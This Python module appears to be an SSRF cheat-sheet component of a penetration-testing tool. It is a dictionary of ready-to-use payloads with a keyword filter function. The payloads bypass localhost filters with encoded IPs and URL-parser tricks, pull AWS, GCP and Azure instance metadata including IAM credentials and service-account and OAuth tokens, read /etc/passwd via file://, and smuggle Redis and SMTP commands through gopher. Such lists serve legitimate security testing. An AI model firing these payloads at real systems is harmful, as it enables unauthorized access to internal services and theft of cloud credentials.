"""SSRF (Server-Side Request Forgery) cheat sheet."""

SSRF_CHEATSHEET = {
    "title": "SSRF (Server-Side Request Forgery) Cheat Sheet",
    "categories": {
        "localhost_bypass": {
            "title": "Localhost Bypass",
            "description": "Bypass localhost/127.0.0.1 filters",
            "payloads": [
                {"payload": "http://127.0.0.1", "description": "Standard localhost"},
                {"payload": "http://localhost", "description": "Localhost hostname"},
                {"payload": "http://127.1", "description": "Shortened IP"},
                {"payload": "http://0.0.0.0", "description": "All interfaces"},
                {"payload": "http://0", "description": "Shortened zero"},
                {"payload": "http://[::1]", "description": "IPv6 localhost"},
                {"payload": "http://[0:0:0:0:0:0:0:1]", "description": "Full IPv6 localhost"},
                {"payload": "http://127.0.0.1.nip.io", "description": "DNS rebinding"},
                {"payload": "http://localtest.me", "description": "DNS pointing to 127.0.0.1"},
                {"payload": "http://127.0.0.1%23@evil.com", "description": "URL fragment bypass"},
            ],
        },

        "ip_encoding": {
            "title": "IP Address Encoding",
            "description": "Different representations of IP addresses",
            "payloads": [
                {"payload": "http://2130706433", "description": "127.0.0.1 as decimal"},
                {"payload": "http://3232235521", "description": "192.168.0.1 as decimal"},
                {"payload": "http://2852039166", "description": "169.254.169.254 as decimal"},
                {"payload": "http://0177.0.0.1", "description": "127.0.0.1 as octal"},
                {"payload": "http://0x7f.0.0.1", "description": "127.0.0.1 mixed hex"},
                {"payload": "http://0x7f000001", "description": "127.0.0.1 full hex"},
                {"payload": "http://127。0。0。1", "description": "Unicode dots"},
            ],
        },

        "aws_metadata": {
            "title": "AWS Metadata Service",
            "description": "Access AWS instance metadata",
            "payloads": [
                {"payload": "http://169.254.169.254/latest/meta-data/", "description": "Metadata root"},
                {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description": "IAM credentials"},
                {"payload": "http://169.254.169.254/latest/meta-data/hostname", "description": "Instance hostname"},
                {"payload": "http://169.254.169.254/latest/meta-data/public-ipv4", "description": "Public IP"},
                {"payload": "http://169.254.169.254/latest/meta-data/public-keys/", "description": "SSH keys"},
                {"payload": "http://169.254.169.254/latest/user-data/", "description": "User data scripts"},
                {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/document", "description": "Instance identity"},
            ],
        },

        "gcp_metadata": {
            "title": "GCP Metadata Service",
            "description": "Access Google Cloud instance metadata",
            "payloads": [
                {"payload": "http://metadata.google.internal/computeMetadata/v1/", "description": "Metadata root (needs header)"},
                {"payload": "http://metadata.google.internal/computeMetadata/v1/project/", "description": "Project info"},
                {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/", "description": "Instance info"},
                {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "Service account token"},
            ],
        },

        "azure_metadata": {
            "title": "Azure Metadata Service",
            "description": "Access Azure instance metadata",
            "payloads": [
                {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "Instance metadata"},
                {"payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01", "description": "OAuth token"},
            ],
        },

        "protocols": {
            "title": "Protocol Smuggling",
            "description": "Abuse different URL schemes",
            "payloads": [
                {"payload": "file:///etc/passwd", "description": "Local file read"},
                {"payload": "dict://localhost:11211/info", "description": "Memcached info"},
                {"payload": "gopher://localhost:25/xHELO%20localhost", "description": "SMTP via gopher"},
                {"payload": "gopher://localhost:6379/_INFO", "description": "Redis via gopher"},
                {"payload": "ftp://localhost", "description": "FTP protocol"},
                {"payload": "sftp://localhost", "description": "SFTP protocol"},
                {"payload": "tftp://localhost", "description": "TFTP protocol"},
                {"payload": "ldap://localhost", "description": "LDAP protocol"},
            ],
        },

        "internal_services": {
            "title": "Internal Services",
            "description": "Common internal service ports",
            "payloads": [
                {"payload": "http://localhost:6379", "description": "Redis"},
                {"payload": "http://localhost:11211", "description": "Memcached"},
                {"payload": "http://localhost:3306", "description": "MySQL"},
                {"payload": "http://localhost:5432", "description": "PostgreSQL"},
                {"payload": "http://localhost:27017", "description": "MongoDB"},
                {"payload": "http://localhost:9200", "description": "Elasticsearch"},
                {"payload": "http://localhost:8080", "description": "Common HTTP alt"},
                {"payload": "http://localhost:8000", "description": "Django/Python dev"},
                {"payload": "http://localhost:5000", "description": "Flask dev"},
                {"payload": "http://localhost:3000", "description": "Node.js dev"},
                {"payload": "http://localhost:9000", "description": "PHP-FPM"},
            ],
        },

        "filter_bypass": {
            "title": "Filter Bypass Techniques",
            "description": "Bypass URL validation filters",
            "payloads": [
                {"payload": "http://evil.com#@127.0.0.1", "description": "Fragment with @"},
                {"payload": "http://127.0.0.1?@evil.com", "description": "Query with @"},
                {"payload": "http://127.0.0.1\\@evil.com", "description": "Backslash with @"},
                {"payload": "http://evil.com@127.0.0.1", "description": "User info"},
                {"payload": "http://127.0.0.1%2523@evil.com", "description": "Double encoded #"},
                {"payload": "http://127.0.0.1:80%2523@evil.com", "description": "Port with encoded #"},
                {"payload": "http://evil.com%00@127.0.0.1", "description": "Null byte"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """Get SSRF cheatsheet."""
    if category and category in SSRF_CHEATSHEET["categories"]:
        result = {
            "title": SSRF_CHEATSHEET["title"],
            "categories": {category: SSRF_CHEATSHEET["categories"][category]},
        }
    else:
        result = SSRF_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
